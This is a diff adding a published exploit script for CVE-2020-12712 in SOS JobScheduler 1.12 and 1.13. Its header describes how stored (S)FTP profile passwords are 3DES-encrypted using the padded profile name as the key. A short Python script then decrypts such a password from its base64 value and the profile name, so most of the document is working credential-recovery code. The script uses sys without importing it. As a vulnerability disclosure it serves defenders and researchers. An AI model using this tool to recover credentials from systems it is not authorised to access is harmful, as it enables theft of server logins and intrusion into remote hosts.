@@ -1,0 +1,37 @@
+# Exploit Title: SOS JobScheduler 1.13.3 - Stored Password Decryption
+# Google Dork: N/A
+# Date: 2020-04-20
+# Exploit Author: Sander Ubink
+# Vendor Homepage: www.sos-berlin.com
+# Software Link: www.sos-berlin.com/en/jobscheduler-downloads
+# Version: Tested on 1.12.9 and 1.13.3, vendor reported 1.12 and 1.13
+# Tested on: Windows and Linux
+# CVE: CVE-2020-12712
+
+# Description: SOS JobScheduler is a tool for remote system administration that allows users to call maintenance scripts via a web interface. 
+# The tool places the maintenance scripts on the remote systems by means of (S)FTP. It allows the user to save profiles for these connections, 
+# in which the password for the (S)FTP connection is optionally stored. When the user chooses to store the password with the profile, 
+# it is encrypted using the name of the profile as the encryption key. Since the name of the profile is stored in the same configuration file, 
+# the plaintext (S)FTP password can trivially be recovered. The encryption algorithm used is Triple DES (3DES) with three keys, requiring a key 
+# length of 24 bytes. The profile name is padded to this length to create the key. Finally, the encrypted password gets base64 encoded before 
+# being stored in the configuration file.
+
+# Usage: python jobscheduler-decrypt.py [encrypted password in base64] [profile name]
+
+import pyDes
+import base64
+import argparse
+
+parser = argparse.ArgumentParser(description="Decrypt the password stored in a Jobscheduler (S)FTP profile configuration file")
+parser.add_argument("password", help="password to be decrypted")
+parser.add_argument("profilename", help="name of the profile")
+args = parser.parse_args()
+
+if len(args.profilename) > 24:
+	sys.exit("Profile name is longer than 24 characters. Check the validity of the input.")
+
+key = args.profilename + ((24 - len(args.profilename)) * " ")
+cipher = pyDes.triple_des(key, pyDes.ECB, b"\0\0\0\0\0\0\0\0", pad=" ", padmode=None)
+plain = cipher.decrypt(base64.b64decode(args.password))
+
+print(plain)
